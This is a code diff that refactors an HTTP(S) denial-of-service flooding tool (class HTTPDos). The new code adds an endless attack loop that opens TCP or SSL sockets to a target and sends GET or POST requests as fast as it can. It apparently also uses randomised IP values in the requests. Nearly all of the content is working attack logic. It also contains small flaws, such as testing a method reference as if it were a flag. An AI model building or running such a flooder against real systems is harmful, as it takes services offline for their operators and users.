@@ -6,7 +6,6 @@ import os
 import sys
 import itertools
 import string
-import time
 from threading import Thread
 from src.utils import color_text
 from src.config import TCP, DEFAULT_NUM_THREADS
@@ -22,55 +21,68 @@ class HTTPDos():
         self.threads = args.threads if args.threads is not None else DEFAULT_NUM_THREADS
         self.monothread = args.monothread if args.monothread is not None else False
         self.ssl_available = False
+        self.request_func = self.get_request_func()
         self.counter = itertools.count(1)
+
+    def get_request_func(self):
+        methods = {
+            'GET': self.get_http_request,
+            'POST': self.post_http_request,
+        }
+        if self.http_method not in methods:
+            raise ValueError(f"[!] Unsupported HTTP method: {self.http_method}")
+        return methods[self.http_method]
 
     def http_flood(self):
         """
         HTTP(S) flood
         """
-        if self.http_method == 'GET':
-            request_func = self.get_http_request
-        elif self.http_method == 'POST':
-            request_func = self.post_http_request
-        else:
-            sys.exit(color_text(
-                'red', '[!] Error : HTTP method only GET or POST'))
-
-        color_text('green', '[+] Connect to send request ...')
-        time.sleep(1)
-        color_text('yellow', '[+] Start sending')
+        color_text('green', '[+] Connect to send request')
 
         if self.protocol == 'https':
             self.ssl_available = self.test_ssl_connection()
 
-        if self.protocol == 'https' and self.ssl_available:
+            if self.ssl_available:
+                color_text('green', '[+] Sending request\n')
+                self.run_attack_loop()
+            else:
+                self.target_port = 80
+                if self.send_packet:
+                    color_text('blue', f'[*] {self.target_ip} on port {self.target_port} is available !\n')
+                    while True:
+                        if (match := input(f"Do you want send packet to {self.target_ip} on port {self.target_port} ? [yes, no] : ").strip().lower()) in ('yes', 'no'):
+                            if match == 'no':
+                                sys.exit('Bye !')
+                            break
 
-            # Create ssl certificat
+                    color_text('green', '[+] Sending request\n')
+                    self.run_attack_loop()
+        elif self.protocol == 'http':
+            color_text('green', '[+] Sending request\n')
+            self.run_attack_loop()
+
+    def run_attack_loop(self):
+        try:
+            while True:
+                self.send_packet()
+                self.count_requests()
+        except KeyboardInterrupt:
+            color_text('red', "\n[!] Interrupted by user. Exiting cleanly.")
+            sys.exit(0)
+
+    def send_packet(self):
+        sock = socket.socket(socket.AF_INET, TCP)
+        
+        if self.ssl_available == True:
             context = ssl.create_default_context()
-            while True:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-                ssl_sock = context.wrap_socket(
-                    sock, server_hostname=self.target_ip)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = context.wrap_socket(sock, server_hostname=self.target_ip)    
 
-                # connection
-                ssl_sock.connect((self.target_ip, self.target_port))
-                ssl_sock.send(request_func())
-                ssl_sock.close()
-
-                self.count_requests
-        else:
-            if self.protocol == 'https':  # if https failure, testing http
-                color_text(
-                    'blue', f'[*] {self.target_ip} on port {self.target_port} is available sending request !')
-            while True:
-                sock = socket.socket(socket.AF_INET, TCP)
-                sock.connect((self.target_ip, self.target_port))
-                # call var with () at the end to call function
-                sock.send(request_func())
-                sock.close()
-
-                self.count_requests
+        sock.connect((self.target_ip, self.target_port))
+        # call var with () at the end to call function
+        sock.send(self.request_func())
+        sock.close()
 
     def test_ssl_connection(self):
         """Fonction pour tester si SSL est disponible sur le serveur"""
@@ -101,6 +113,15 @@ class HTTPDos():
         if request_nb % 10_000 == 0:
             sys.stdout.write(f'{request_nb} request send !\r\n')
             sys.stdout.flush()
+
+
+
+
+
+
+
+
+
 
     def get_http_request(self):
         random_ip = self.http_random_ip()
